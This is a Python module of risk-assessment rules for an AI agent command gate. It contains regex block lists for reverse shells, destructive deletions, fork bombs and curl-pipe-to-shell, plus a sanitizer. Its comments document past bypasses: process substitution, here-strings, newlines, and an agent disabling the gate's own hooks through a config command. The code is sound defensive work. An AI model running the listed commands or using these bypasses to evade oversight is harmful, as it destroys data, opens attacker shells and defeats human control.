"""Centralized risk assessment rules.

Single source of truth — imported by command_interceptor, audit_logger, and config_schema.

Risk patterns are matched against a *sanitized* view of the command line (see
``sanitize_command_for_matching``), not the raw string: quoted text that a
command consumes as DATA (a commit message, a PR body, an ``echo`` argument)
must not be mistaken for a command, while quoted text that a shell or eval
wrapper EXECUTES (``bash -c "…"``, ``eval "…"``) must still be scanned.
"""
from __future__ import annotations

import re

# Directories where `rm -rf /<dir>` is catastrophic (data loss / unbootable).
_CRITICAL_DIRS = "home|etc|usr|boot|root|sys|proc|lib|lib64|bin|sbin|opt"

# Reverse shells -- an interactive shell handed to an attacker over a socket. In
# an agent-security product these must never rate low/allowed (sable-0ki7:
# evaluate_command rated them low). Folded into CRITICAL so they are hard-blocked
# with no policy opt-out. Matched against the sanitized command (see
# assess_command_risk), so an eval's -c/-e argument is inlined and quoted prose is
# redacted. Parity with the Node sources in node/src/core/risk-rules.ts; benign
# look-alikes (nc -z, OpenBSD nc -C host 25, socat - TCP:h:p, docker.socket,
# --socket-path ... /bin/bash, trace=socket /bin/sh, ls config/dev/tcp/,
# `import socket; print(...)`) covered with no false positive by the test suite.
# Known limits fail OPEN because the payload is unreadable after sanitization, not
# because a pattern is loose (tracked for follow-up, not papered over with a broad
# rule that would hard-block benign commands): a payload piped into a non-shell
# interpreter (`echo '<code>' | python3`); a variable-split or base64/$() blob;
# the quoted-operand forms of php -r, socat exec:'/bin/sh', gawk, telnet, rcat.
# `... | sh` and base64-into-shell still degrade to high via shell_program_from_stream.
_REVERSE_SHELL_PATTERNS: list[str] = [
    # bash/zsh net redirect `>& /dev/tcp/host/port`: output to the socket or
    # fd duplication onto it (`>`, `>&`, `&>`, `<>`, `<&`), or a shell reading
    # its program from it (`bash < /dev/tcp/...`; `-c` excluded so the inlined
    # payload is not mistaken for the shell's stdin). A read-only redirect (the
    # wait-for-port idiom `bash -c '</dev/tcp/h/p'`, `cat < /dev/tcp/...`) and a
    # path component (`ls config/dev/tcp/`) do not match.
    r"((>|<>|[<>]&)\s*|\b(ba|z|da|k|a)?sh(\s+-[abd-z]+)*\s*<\s*)/dev/(tcp|udp)/",
    # ...or an interactive shell anywhere beside the pseudo-device.
    r"^(?=[\s\S]*(^|[\s<>&;|])/dev/(tcp|udp)/)(?=[\s\S]*\b(ba|z|da|k|a)?sh\s+-[a-z]*i)",
    # netcat exec flag: `-e` anywhere in a short cluster (`-e`/`-ve`/`-nve`) or
    # long `--exec`/`--sh-exec`/`--lua-exec`. `-c` omitted: after case-folding it
    # collides with OpenBSD `nc -C` (CRLF); no benign nc cluster carries `e`.
    r"\b(nc|ncat|netcat)\b[^|;&]*\s(-[a-z]*e\b|--(sh-|lua-)?exec\b)",
    # named-pipe relay: fifo AND netcat AND a shell (any order); a fifo beside a
    # benign `nc -z`/`nc -l` health check lacks the shell and does not match
    r"^(?=[\s\S]*\b(mkfifo|mknod)\b)(?=[\s\S]*\b(nc|ncat|netcat)\b)(?=[\s\S]*(/bin/(ba)?sh|\b(ba)?sh\b[^\n]*-i))",
    # socat with a program endpoint (`EXEC:`/`SYSTEM:`); not a plain relay
    r"\bsocat\b[\s\S]*\b(exec|system):",
    # interpreter socket one-liner, part A: a socket *call* (not the bare word,
    # in --socket-path/docker.socket/trace=socket) + a spawn that NAMES a shell.
    # Order-independent anchored lookaheads: catches the socket-after-spawn
    # (canonical Node.js) form, and linear (no prefix[\s\S]*suffix backtracking).
    r"""^(?=[\s\S]*(socket\.socket|\bsocket\s*\(|tcpsocket\.|io::socket|pf_inet|sock_stream|net\.socket))(?=[\s\S]*(pty\.spawn|/bin/(ba)?sh|(os\.system|system|exec|popen|spawnsync|spawn|subprocess\.(call|run|popen|check_output|check_call))\s*[\s(\[{"']*/?(bin/)?(ba|z|da|a|k)?sh\b))""",
    # interpreter socket one-liner, part B: a socket call + a generic exec/system
    # + socket-fd wiring (dup2/fileno/pipe/redirect/read-loop). Catches forms
    # whose shell name arrives from the socket at runtime (perl `system $_ while
    # <$s>`, a node `.pipe()` bridge) without hard-blocking a benign socket
    # script that merely shells out (which has no such wiring).
    r"^(?=[\s\S]*(socket\.socket|\bsocket\s*\(|tcpsocket\.|io::socket|pf_inet|sock_stream|net\.socket))(?=[\s\S]*(\bexec\b|\bsystem\b|os\.system|subprocess\.|\bpopen\s*\(|\bspawn\s*\())(?=[\s\S]*(dup2|fileno|\.pipe\s*\(|<&|>&|fdopen|while\s*<))",
    # zsh TCP-module reverse shell (`zmodload zsh/net/tcp; ztcp host port; ...`)
    r"\bzmodload\b[\s\S]*zsh/net/tcp",
    # powershell/pwsh TCPClient reverse shell (cross-platform pwsh on Linux too)
    r"system\.net\.sockets\.tcpclient",
]

# Catastrophic, irreversible commands. Hard-blocked unconditionally — no policy,
# mode, or deny-list can opt out of them.
CRITICAL_PATTERNS: list[str] = [
    # rm -rf / (root only, any flag order: -rf, -fr, -r -f, -f -r)
    r"rm\s+(-[a-z]*r[a-z]*\s+)*-[a-z]*f[a-z]*\s+/(\s|$)",
    r"rm\s+(-[a-z]*f[a-z]*\s+)*-[a-z]*r[a-z]*\s+/(\s|$)",
    # rm -rf on critical top-level directories
    rf"rm\s+(-[a-z]*r[a-z]*\s+)*-[a-z]*f[a-z]*\s+/({_CRITICAL_DIRS})(/|\s|$)",
    rf"rm\s+(-[a-z]*f[a-z]*\s+)*-[a-z]*r[a-z]*\s+/({_CRITICAL_DIRS})(/|\s|$)",
    r":\(\)\{\s*:\|:&\s*\};:",
    r"dd\s+if=.*of=/dev/sd",
    r">\s*/dev/sd",
    r"mkfs",
    r"fdisk",
    r"parted",
    *_REVERSE_SHELL_PATTERNS,
]

HIGH_PATTERNS: list[str] = [
    r"rm\s+(-[a-z]*r[a-z]*\s+)*-[a-z]*f[a-z]*",   # rm -rf, -fr, -r -f, -f -r
    r"rm\s+(-[a-z]*f[a-z]*\s+)*-[a-z]*r[a-z]*",   # reversed order
    r"sudo\s+rm",
    r"chmod\s+777",
    r"curl.*\|\s*(bash|sh|zsh|dash)\b",
    r"wget.*\|\s*(bash|sh|zsh|dash)\b",
    r"git\s+push\b.*\s--force\b",                          # --force anywhere after push
    r"git\s+push\b.*\s-[a-zA-Z]*f\b",                     # -f or combined flags like -vf
    r"git\s+push\b.*\s--force-(with-lease|if-includes)\b", # specific force variants
    r"git\s+push\s+\S*\s+\+",                             # refspec force: git push origin +main
    r"docker\s+system\s+prune",
    r"npm\s+publish",
    r"pypi.*upload",
]

MEDIUM_PATTERNS: list[str] = [
    r"sudo", r"chmod", r"chown", r"systemctl",
    r"service", r"kill\s+-9", r"pkill", r"killall",
]

# Default policy deny-list. Identical to the built-in unconditional hard-block
# set: a deny-list entry hard-denies, so the *defaults* must never match a merely
# approval-grade command. (The old literals — e.g. the substring "rm -rf /" —
# hard-denied `rm -rf /tmp/build`, which is HIGH and belongs in
# DEFAULT_REQUIRE_APPROVAL, not in a deny-list.)
DEFAULT_BLOCKED_PATTERNS: list[str] = list(CRITICAL_PATTERNS)

DEFAULT_REQUIRE_APPROVAL: list[str] = [
    "rm -rf",
    "sudo rm",
    r"curl.*\|\s*(bash|sh|zsh|dash)\b",
    r"wget.*\|\s*(bash|sh|zsh|dash)\b",
    "chmod 777",
    "git push --force",
    "git push -f",
    "git push --force-with-lease",
    "git push --force-if-includes",
    r"git push .* \+",
]


# ---------------------------------------------------------------------------
# Argument-aware command sanitizer
# ---------------------------------------------------------------------------
#
# The risk patterns above describe *shell commands*. Matching them against the
# raw command line treats quoted argument text as if it were a command, so
#
#     gh pr create --body "…don't git push --force…"
#     git commit -m "don't git push --force"
#
# were flagged as force-pushes. Simply ignoring quoted text is NOT a fix: a shell
# or eval wrapper *executes* its quoted argument, so `bash -c "rm -rf /"` must
# still hard-block. The sanitizer is therefore argument-aware:
#
#   * tokenize respecting quotes, escapes, command substitution and redirects;
#   * split on chain operators (`;` `&&` `||` `|` `&`), keeping them in place so
#     pipeline rules (`curl … | bash`) still match;
#   * a shell's `-c` argument IS a command -> recursively sanitize and inline it;
#   * `$(…)` / backticks (outside single quotes) ARE commands -> same;
#   * arguments a command consumes as text (`echo`/`grep` operands, `-m`,
#     `--body`, …) and prose-shaped quoted arguments are DATA -> redacted;
#   * everything else is preserved byte for byte.
#
# Known limitation: an *unrecognized* evaluator that takes a bare quoted command
# string with no `-c`/`-e`-style flag (e.g. a bespoke `myrunner "rm -rf /"`) has
# its argument treated as data. Anything reached through a real shell, an eval
# flag, a substitution, or an unquoted argument is still scanned.

# Shells whose `-c` argument is a command string to execute.
_SHELL_EXECS = {"bash", "sh", "zsh", "dash", "ksh", "ash", "fish", "su"}

# Execs whose arguments are executable text (a remote command, a script).
_EVAL_EXECS = {
    # `trap 'cmd' EXIT` registers a command string that runs when the shell
    # LEAVES. The payload is an ordinary quoted operand, so without this it is
    # redacted as prose exactly as `echo "..."` correctly is. The deferral
    # changes the deny message and the audit trail, not the decision. (rf-zvll A2)
    "trap",
    "eval",
    "exec",
    "ssh",
    "sshpass",
    "xargs",
}

# Flags carrying an executable string (`bash -c`, `python -c`, `mysql -e`, `find -exec`).
_EVAL_FLAGS = {"-c", "-e", "--command", "--execute", "--eval", "-exec", "--exec"}

# Prefix wrappers that delegate to the command that follows them.
_TAIL_WRAPPERS = {
    "sudo", "doas", "env", "nohup", "timeout", "nice", "ionice",
    "time", "watch", "setsid", "stdbuf", "chrt", "command",
}

# Commands whose operands are pure text data — searching or printing, never executing.
_TEXT_EXECS = {"echo", "printf", "grep", "egrep", "fgrep", "rg", "ag", "ack"}

# Flags whose value is human prose (a message, a body, a title) — never a command.
_TEXT_FLAGS = {
    "-m", "--message", "--body", "--body-text", "--title", "--description",
    "--reason", "--notes", "--subject", "--comment", "--annotation",
}

# Operators that chain independent commands.
_CHAIN_OPS = {";", "&&", "||", "|", "&"}



# Operators whose following token is a redirect target (a path — never data).
# `<<<` is deliberately ABSENT: it is a here-STRING, and its operand is stdin
# CONTENT, not a path. Treating it as a redirect target left the text untouched,
# which over-blocked a data owner (`cat <<< "…rm -rf /…" > notes.md` classified
# critical -- #230's shape, one operator over) and under-blocked a shell one
# (`bash <<< "rm -rf /"` classified high, though the shell runs it). Falling
# through to the ordinary operand path asks the question the heredoc work
# already answers: does this command execute what it reads? (sable-4nt2)
_REDIRECT_OPS = {">", ">>", "<", "<<"}

# Bound on recursion through nested shell wrappers / substitutions.
_MAX_SANITIZE_DEPTH = 8

_ENV_ASSIGNMENT = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=")
_SHELL_C_FLAG = re.compile(r"^-[a-z]*c$")
_LONG_FLAG_WITH_VALUE = re.compile(r"^(--[a-z][a-z-]*)=")
_NUMERIC_ARG = re.compile(r"^\d+[a-z]*$", re.IGNORECASE)
_WHITESPACE = re.compile(r"\s")

# A heredoc introducer: `<<`, optional `-`/`~` (indented-terminator forms), an
# optional quote around the delimiter, and the delimiter word. Group 1 is the
# dash/tilde, group 3 is the delimiter name.
_HEREDOC_START = re.compile(
    # The `(?<!<)` / `(?!<)` guards are load-bearing: without them `<<<`
    # matches starting at its SECOND `<`, so `cat <<< "hello"` is read as a
    # heredoc with delimiter `hello`, no terminator is ever found, and every
    # line after it is stripped — silently hiding whatever came next from the
    # classifier, hard block included.
    r"(?<!<)<<(?!<)([-~]?)\s*(['\"]?)([A-Za-z_][A-Za-z0-9_]*)\2"
)
# Chain/pipe operators, used to find the statement that owns a heredoc.
_CHAIN_SPLIT = re.compile(r"\|\||&&|[;|&]")


class _Piece:
    """A word or an operator, with its span in the source string."""

    __slots__ = ("start", "end", "op", "text", "quoted", "substs")

    def __init__(
        self,
        start: int,
        end: int,
        op: str | None,
        text: str,
        quoted: bool,
        substs: list[str],
    ) -> None:
        self.start = start
        self.end = end
        self.op = op
        self.text = text
        self.quoted = quoted
        self.substs = substs


def _is_op_char(c: str) -> bool:
    # \n and \r are statement separators (rf-6pqx): a newline ends a command
    # exactly as ";" does, so a payload on a later line is classified on its own.
    return c in (";", "&", "|", ">", "<", "\n", "\r")


def _read_subst(s: str, i: int) -> tuple[str, int]:
    """Read a `$(…)` substitution starting at `i`; return its contents and next index."""
    j = i + 2
    depth = 1
    inner: list[str] = []
    while j < len(s) and depth > 0:
        ch = s[j]
        if ch == "(":
            depth += 1
        elif ch == ")":
            depth -= 1
            if depth == 0:
                j += 1
                break
        inner.append(ch)
        j += 1
    return "".join(inner), j


def _read_backtick(s: str, i: int) -> tuple[str, int]:
    j = i + 1
    inner: list[str] = []
    while j < len(s) and s[j] != "`":
        inner.append(s[j])
        j += 1
    return "".join(inner), min(j + 1, len(s))


def _tokenize(s: str) -> tuple[list[_Piece], bool]:
    """Split a command line into words and operators, respecting quotes/substitutions.

    Returns (pieces, unterminated). `unterminated` is True when a quote was never
    closed — the parse is then unreliable and the caller must FAIL CLOSED
    (match the raw string) rather than trust a desynchronized sanitization
    (se-y6vo: `$'a\\'b'` desyncs quote state and swallows a trailing payload).
    """
    pieces: list[_Piece] = []
    i = 0
    n = len(s)
    unterminated = False

    while i < n:
        c = s[i]

        # Whitespace EXCEPT newlines is skipped; a newline falls through to the
        # operator branch below so it becomes a statement separator (rf-6pqx).
        if c.isspace() and c not in ("\n", "\r"):
            i += 1
            continue

        # `<(cmd)` / `>(cmd)` -- PROCESS SUBSTITUTION. The content is a command
        # that RUNS, exactly as `$(cmd)` does, so it goes in substs and the
        # existing recursive scan handles it with no new rule.
        #
        # Without this the tokenizer never forms the construct: it emits op `<`,
        # which is in _REDIRECT_OPS, so `(cmd` becomes a redirect TARGET and is
        # left untouched, while the remaining words are redacted as the host's
        # data operands. TWO independent wrong decisions that conspire --
        # `ack <(rm -rf /)` sanitized to `ack <(rm    `, the harmless-looking
        # head preserved and the dangerous tail deleted. Fixing either alone
        # leaves the bypass, which is worth knowing when reviewing this. (rf-zvll)
        if c in ("<", ">") and i + 1 < n and s[i + 1] == "(":
            start = i
            inner, i = _read_subst(s, i)
            pieces.append(_Piece(start, i, None, "", False, [inner]))
            continue

        if _is_op_char(c):
            start = i
            if c in ("\n", "\r"):
                # Normalize a line break (incl. CRLF) to a ";" separator piece.
                i += 1
                pieces.append(_Piece(start, i, ";", ";", False, []))
                continue
            two = s[i:i + 2]
            # `<<<` before `<<`, or it tokenizes as `<<` + `<` and the
            # here-string operand becomes a redirect target -- left untouched,
            # which is how it ended up both over- and under-blocked
            # (sable-4nt2).
            three = s[i:i + 3]
            if three == "<<<":
                op = three
            elif two in ("&&", "||", ">>", "<<"):
                op = two
            else:
                op = c
            i += len(op)
            pieces.append(_Piece(start, i, op, op, False, []))
            continue

        start = i
        text: list[str] = []
        quoted = False
        substs: list[str] = []

        while i < n:
            ch = s[i]
            if ch.isspace() or _is_op_char(ch):
                break

            if ch == "\\":
                # Line continuation: a backslash immediately before a newline
                # (incl. CRLF) is DELETED by the shell — `r\<NL>m` is `rm`, so
                # the newline must not be absorbed into the word (rf-6pqx/se-y6vo).
                nxt = s[i + 1] if i + 1 < n else ""
                if nxt == "\n":
                    i += 2
                    continue
                if nxt == "\r":
                    i += 2
                    if i < n and s[i] == "\n":
                        i += 1
                    continue
                i += 1
                if i < n:
                    text.append(s[i])
                    i += 1
                continue

            # Single quotes are inert: no expansion, no substitution.
            if ch == "'":
                i += 1
                quoted = True
                closed = False
                while i < n:
                    if s[i] == "'":
                        closed = True
                        i += 1
                        break
                    text.append(s[i])
                    i += 1
                if not closed:
                    unterminated = True
                continue

            # Double quotes are data, but `$( )` / backticks inside them DO execute.
            if ch == '"':
                i += 1
                quoted = True
                closed = False
                while i < n:
                    if s[i] == '"':
                        closed = True
                        i += 1
                        break
                    if s[i] == "\\":
                        nxt = s[i + 1] if i + 1 < n else ""
                        if nxt == "\n":
                            i += 2
                            continue
                        if nxt == "\r":
                            i += 2
                            if i < n and s[i] == "\n":
                                i += 1
                            continue
                        i += 1
                        if i < n:
                            text.append(s[i])
                            i += 1
                        continue
                    if s[i] == "$" and i + 1 < n and s[i + 1] == "(":
                        inner, i = _read_subst(s, i)
                        substs.append(inner)
                        continue
                    if s[i] == "`":
                        inner, i = _read_backtick(s, i)
                        substs.append(inner)
                        continue
                    text.append(s[i])
                    i += 1
                if not closed:
                    unterminated = True
                continue

            if ch == "$" and i + 1 < n and s[i + 1] == "(":
                inner, i = _read_subst(s, i)
                substs.append(inner)
                continue
            if ch == "`":
                inner, i = _read_backtick(s, i)
                substs.append(inner)
                continue

            text.append(ch)
            i += 1

        pieces.append(_Piece(start, i, None, "".join(text), quoted, substs))

    return pieces, unterminated


def is_chained_command(command: str) -> bool:
    r"""True if the command contains more than one statement.

    Asked of the TOKENIZER rather than a regex. The first version of this was
    ``re.compile(r"[;|&]|&&|\|\|")``, which omits the newline — and a newline
    has been a statement separator in this module since rf-6pqx. With
    ``^git push origin feature/`` allowlisted, ``git push origin feature/x`` and
    a second line holding ``git push --force origin main`` classified ``allow``.
    The tokenizer already normalises ``\n`` to ``;``, so routing the question
    through it removes the second, narrower definition instead of widening it.
    """
    pieces, _ = _tokenize(command)
    return any(p.op is not None and p.op in _CHAIN_OPS for p in pieces)


def _exec_name(text: str) -> str:
    """`/usr/bin/rm` -> `rm`; used to classify the executable of a segment."""
    return text[text.rfind("/") + 1:].lower()


def _segment_exec(pieces: list[_Piece]) -> str:
    """The effective executable of a segment (`sudo rm -rf /` -> `rm`).

    Used to ask what the NEXT stage of a pipeline does with this stage's output.
    """
    is_redirect_target = [False] * len(pieces)
    for i in range(1, len(pieces)):
        prev = pieces[i - 1]
        if prev.op in _REDIRECT_OPS and pieces[i].op is None:
            is_redirect_target[i] = True
    i = 0
    while i < len(pieces):
        p = pieces[i]
        if p.op is not None or is_redirect_target[i]:
            i += 1
            continue
        if not p.quoted and _ENV_ASSIGNMENT.match(p.text):
            i += 1
            continue
        if not p.quoted and _exec_name(p.text) in _TAIL_WRAPPERS:
            j = i + 1
            while j < len(pieces):
                q = pieces[j]
                if q.op is not None or is_redirect_target[j]:
                    j += 1
                    continue
                if q.text.startswith("-") or _NUMERIC_ARG.match(q.text):
                    j += 1
                    continue
                break
            i = j
            continue
        return _exec_name(p.text)
    return ""


def _process_segment(
    pieces: list[_Piece],
    depth: int,
    out: list[tuple[int, int, str]],
    piped_into_shell: bool = False,
    output_executed: bool = False,
) -> None:
    """Decide which spans of one segment are DATA and which are code."""
    # A word is a redirect target when the piece before it is `>`/`>>`/`<`.
    is_redirect_target = [False] * len(pieces)
    for i in range(1, len(pieces)):
        prev = pieces[i - 1]
        if prev.op in _REDIRECT_OPS and pieces[i].op is None:
            is_redirect_target[i] = True

    # Effective executable: skip env assignments and prefix wrappers (`sudo`,
    # `env`, `timeout 5`, `nice -n 15`, …) to reach the command they delegate to.
    exec_idx = -1
    i = 0
    while i < len(pieces):
        p = pieces[i]
        if p.op is not None or is_redirect_target[i]:
            i += 1
            continue
        if not p.quoted and _ENV_ASSIGNMENT.match(p.text):
            i += 1
            continue
        if exec_idx == -1 and not p.quoted and _exec_name(p.text) in _TAIL_WRAPPERS:
            # Skip the wrapper's own flags and their numeric/duration values.
            j = i + 1
            while j < len(pieces):
                q = pieces[j]
                if q.op is not None or is_redirect_target[j]:
                    j += 1
                    continue
                if q.text.startswith("-") or _NUMERIC_ARG.match(q.text):
                    j += 1
                    continue
                break
            i = j
            continue
        exec_idx = i
        break

    exec_ = "" if exec_idx == -1 else _exec_name(pieces[exec_idx].text)
    is_text_exec = exec_ in _TEXT_EXECS

    # A segment is code-carrying when some part of it is a command string the
    # segment will execute: a shell, an eval-style flag, or an eval-style exec.
    # Its quoted arguments are NOT prose and must stay visible to the patterns.
    has_shell_exec = False
    has_eval_flag = False
    for i, p in enumerate(pieces):
        if p.op is not None or is_redirect_target[i]:
            continue
        if not p.quoted and _exec_name(p.text) in _SHELL_EXECS:
            has_shell_exec = True
        if not p.quoted and p.text.lower() in _EVAL_FLAGS:
            has_eval_flag = True
    code_carrying = has_shell_exec or has_eval_flag or exec_ in _EVAL_EXECS

    # sable-c6an. Two questions the code conflated:
    #   code_carrying   -- this segment RUNS a command string it was handed
    #   executes_output -- this segment's STDOUT becomes code somewhere else
    #                      (`… | bash`, or a substitution used as a -c script)
    # `bash -c "echo 'rm -rf /'"` is the first and not the second, so its
    # operand stays data; `bash -c "$(echo rm -rf /)"` is the second.
    executes_output = piped_into_shell or output_executed

    seen_shell = False
    pending_script = False
    prev_text_flag = False

    for i, p in enumerate(pieces):
        if p.op is not None:
            prev_text_flag = False
            continue

        is_exec_tok = i == exec_idx
        flag_name = p.text.lower()

        if not p.quoted and _exec_name(p.text) in _SHELL_EXECS:
            seen_shell = True

        # `bash -c <script>` — the next word is a command string, not data.
        if pending_script and not p.text.startswith("-"):
            # The script can be entirely a substitution -- `bash -c "$(…)"` --
            # where `text` is EMPTY and the substitution IS the script. Reading
            # only `text` dropped it (sable-c6an).
            parts: list[str] = []
            if p.text != "":
                parts.append(_sanitize(p.text, depth + 1))
            for sub in p.substs:
                parts.append(_sanitize(sub, depth + 1, True))
            out.append((p.start, p.end, " ".join(parts)))
            pending_script = False
            prev_text_flag = False
            continue

        if seen_shell and not p.quoted and _SHELL_C_FLAG.match(flag_name):
            pending_script = True
            prev_text_flag = False
            continue

        # `$(…)` / backticks execute — scan their contents, drop the literal wrapper.
        if p.substs:
            inner = " ".join(
                _sanitize(s, depth + 1, code_carrying or executes_output)
                for s in p.substs
            )
            out.append((p.start, p.end, inner))
            prev_text_flag = False
            continue

        if is_redirect_target[i]:
            prev_text_flag = False
            continue
        if is_exec_tok:
            # Unquote a quoted executable so quoting the *command name* cannot
            # break the pattern anchors (`"rm" -rf /`, `r"m" -rf /`,
            # `watch "rm -rf /"`). Unquoting only exposes more to the patterns.
            if p.quoted:
                out.append((p.start, p.end, p.text))
            prev_text_flag = False
            continue

        # Value of a prose flag (`-m "…"`, `--body "…"`) — always data, even
        # inside a code-carrying segment (`git commit -e -m "…git push --force"`).
        if prev_text_flag:
            out.append((p.start, p.end, " "))
            prev_text_flag = False
            continue

        long_flag = None if p.quoted else _LONG_FLAG_WITH_VALUE.match(p.text)
        if long_flag and long_flag.group(1) in _TEXT_FLAGS:
            out.append((p.start, p.end, long_flag.group(1)))
            continue

        if flag_name in _TEXT_FLAGS:
            prev_text_flag = True
            continue
        prev_text_flag = False

        # Operands of a text command (`echo`, `grep`, `printf`) are never executed.
        if is_text_exec and i > exec_idx and not executes_output:
            out.append((p.start, p.end, " "))
            continue

        if p.quoted:
            is_prose = bool(_WHITESPACE.search(p.text))
            if not is_prose:
                # Single-word quoted operand: unquote it so quoting cannot hide a
                # flag or a path from the patterns (`rm "-rf" "/"`).
                out.append((p.start, p.end, p.text))
            elif code_carrying or executes_output:
                # This segment executes a command string (`ssh host "…"`,
                # `mysql -e "…"`). The quoted argument is code — unquote and scan
                # it, recursively.
                out.append((p.start, p.end, _sanitize(p.text, depth + 1)))
            else:
                # A quoted, multi-word argument to an ordinary command is prose.
                out.append((p.start, p.end, " "))


def _strip_line_continuations(s: str) -> str:
    """Remove `\\<newline>` line continuations the way a shell does BEFORE parsing.

    `r\\<NL>m -rf /` is `rm -rf /` to bash, so the backslash-newline must be
    deleted or the token `rm` never forms and the pattern misses it (se-y6vo).
    Removed when unquoted or inside double quotes; PRESERVED inside single quotes
    (where bash keeps it literal). A normal escape (`\\x`) is left untouched.
    """
    if "\\" not in s:
        return s
    out: list[str] = []
    i = 0
    n = len(s)
    in_single = False
    in_double = False
    while i < n:
        c = s[i]
        if c == "'" and not in_double:
            in_single = not in_single
            out.append(c)
            i += 1
            continue
        if c == '"' and not in_single:
            in_double = not in_double
            out.append(c)
            i += 1
            continue
        if c == "\\" and not in_single:
            nxt = s[i + 1] if i + 1 < n else ""
            if nxt == "\n":
                i += 2
                continue
            if nxt == "\r":
                i += 2
                if i < n and s[i] == "\n":
                    i += 1
                continue
            # A normal escape (`\"`, `\$`, …): keep both chars verbatim so an
            # escaped quote does not flip the quote state above.
            out.append(c)
            if i + 1 < n:
                out.append(s[i + 1])
                i += 2
            else:
                i += 1
            continue
        out.append(c)
        i += 1
    return "".join(out)


def _sanitize(command: str, depth: int, output_executed: bool = False) -> str:
    if not command or depth > _MAX_SANITIZE_DEPTH:
        return command

    command = _strip_line_continuations(command)
    pieces, unterminated = _tokenize(command)
    # Fail closed: an unterminated quote means the parse desynchronized from the
    # shell, so a sanitized view could hide an executable payload. Match the raw
    # command instead (se-y6vo).
    if unterminated:
        return command
    replacements: list[tuple[int, int, str]] = []

    # Segments keep the operator that ends them, so a segment can be asked
    # whether its output feeds a shell (`echo "rm -rf /" | bash`).
    segments: list[tuple[list[_Piece], str | None]] = []
    segment: list[_Piece] = []
    for p in pieces:
        if p.op is not None and p.op in _CHAIN_OPS:
            segments.append((segment, p.op))
            segment = []
            continue
        segment.append(p)
    segments.append((segment, None))

    for k, (seg, end_op) in enumerate(segments):
        piped_into_shell = (
            end_op == "|"
            and k + 1 < len(segments)
            and _segment_exec(segments[k + 1][0]) in _SHELL_EXECS
        )
        _process_segment(
            seg, depth, replacements, piped_into_shell, output_executed
        )

    if not replacements:
        return command

    replacements.sort(key=lambda r: r[0])
    out: list[str] = []
    cursor = 0
    for start, end, text in replacements:
        if start < cursor:
            continue
        out.append(command[cursor:start])
        out.append(text)
        cursor = end
    out.append(command[cursor:])
    return "".join(out)


def _heredoc_owner_executes(line: str, lt_pos: int) -> bool:
    """Does the command that owns the heredoc EXECUTE its body?

    `cat > f <<EOF` / `grep -q x <<EOF` consume the body as DATA (write it,
    search it). `bash <<EOF` / `sh <<'EOF'` / `ssh host <<EOF` EXECUTE it. Only
    the data case may be stripped; an executed body must stay visible to the
    patterns (else the newline fix would open a fresh bypass — se-y6vo).
    """
    head = line[:lt_pos]
    segments = _CHAIN_SPLIT.split(head)
    seg = segments[-1] if segments else head
    tokens = seg.split()
    idx = 0
    while idx < len(tokens):
        tok = tokens[idx]
        if _ENV_ASSIGNMENT.match(tok):
            idx += 1
            continue
        name = _exec_name(tok)
        if name in _TAIL_WRAPPERS:
            idx += 1
            while idx < len(tokens) and (
                tokens[idx].startswith("-") or _NUMERIC_ARG.match(tokens[idx])
            ):
                idx += 1
            continue
        return name in _SHELL_EXECS or name in _EVAL_EXECS
    return False


def _heredoc_output_piped_to_shell(line: str, lt_pos: int) -> bool:
    """`cat <<EOF | bash` — the body is data to `cat`, but `cat`'s OUTPUT is the
    script, so the body is executed after all.

    The owner check above only reads the text BEFORE the introducer and never
    sees the pipe, so without this a heredoc piped into a shell is stripped and
    the hard block is silently lost. Keeping a body is the safe direction: it
    can only over-block, and only for a shape that should block anyway.
    """
    for stage in line[lt_pos:].split("|")[1:]:
        tokens = [t for t in stage.strip().split() if t]
        idx = 0
        while idx < len(tokens):
            tok = tokens[idx]
            if _ENV_ASSIGNMENT.match(tok):
                idx += 1
                continue
            name = _exec_name(tok)
            if name in _TAIL_WRAPPERS:
                idx += 1
                while idx < len(tokens) and (
                    tokens[idx].startswith("-") or _NUMERIC_ARG.match(tokens[idx])
                ):
                    idx += 1
                continue
            return name in _SHELL_EXECS or name in _EVAL_EXECS
    return False


def _strip_heredoc_bodies(command: str) -> str:
    """Blank heredoc BODIES that a command consumes as DATA, before tokenizing.

    A heredoc body written to a file (`cat > doc.md <<EOF … EOF`) or searched
    (`grep <<EOF … EOF`) is data, never executed. Leaving it in place makes the
    newline-as-separator fix (rf-6pqx) classify ordinary documentation writes as
    CRITICAL (rf-3rsj), and is the same over-block the public #230 reporter hit.
    Stripping it fixes both. A body EXECUTED by a shell/eval owner is KEPT so it
    is still scanned. Co-designed with kerckhoffs (se-ijzs) and achebe (#230).

    Known limits: a literal `<<WORD` inside a quoted string is still treated as an
    introducer, and delimiters are matched by `.strip() == DELIM` (looser than
    bash, erring toward scanning more, which is the safe direction).
    """
    if "<<" not in command:
        return command
    lines = command.split("\n")
    out: list[str] = []
    k = 0
    while k < len(lines):
        line = lines[k]
        out.append(line)
        matches = list(_HEREDOC_START.finditer(line))
        k += 1
        if not matches:
            continue
        lt_pos = matches[0].start()
        keep = _heredoc_owner_executes(line, lt_pos) or (
            _heredoc_output_piped_to_shell(line, lt_pos)
        )
        for m in matches:
            delim = m.group(3)
            dash = m.group(1)  # '-'/'~': a tab-indented terminator is allowed
            while k < len(lines):
                # bash terminates a heredoc only on a line EXACTLY equal to the
                # delimiter — for plain `<<` an indented delimiter is body, not a
                # terminator; `<<-` strips leading TABS first. (rstrip \r for CRLF.)
                cand = lines[k].rstrip("\r")
                if dash:
                    cand = cand.lstrip("\t")
                if cand == delim:
                    k += 1  # drop the terminator line
                    break
                if keep:
                    out.append(lines[k])
                k += 1
    return "\n".join(out)


def sanitize_command_for_matching(command: str) -> str:
    """Normalize a command line for risk/policy pattern matching.

    Quoted text the command consumes as DATA is redacted; text a shell or eval
    wrapper EXECUTES is preserved (and recursively sanitized). Heredoc bodies
    consumed as data are stripped first. Everything else is untouched.
    """
    command = _strip_heredoc_bodies(command)
    return _sanitize(command, 0)


# rf-vnxs — reconfiguring rafter's OWN security controls is a PROTECTED CLASS.
#
# The gate must never approve its own disarming. On 0.10.1 it did: the hook
# rated `rafter agent config set agent.hooks.enabled false` as `low`, allowed
# it, and every later command — including the CRITICAL tier that no policy,
# mode or deny-list can override — was then permitted. Three steps, no
# malformed command, and it persists to config.json.
#
# Matched STRUCTURALLY (resolved exec + argv walk), never by string: every one
# of these was observed ALLOWED on the published artifact — extra whitespace,
# `FALSE`, `npx @rafter-security/cli …`, `pnpm dlx`, `sudo -E rafter …`, an
# absolute path, the `agent disable` component route, and three separate
# self-disabling keys. A blacklist of one string is one alias from being inert.
_RAFTER_EXECS = {"rafter", "rafter-cli"}
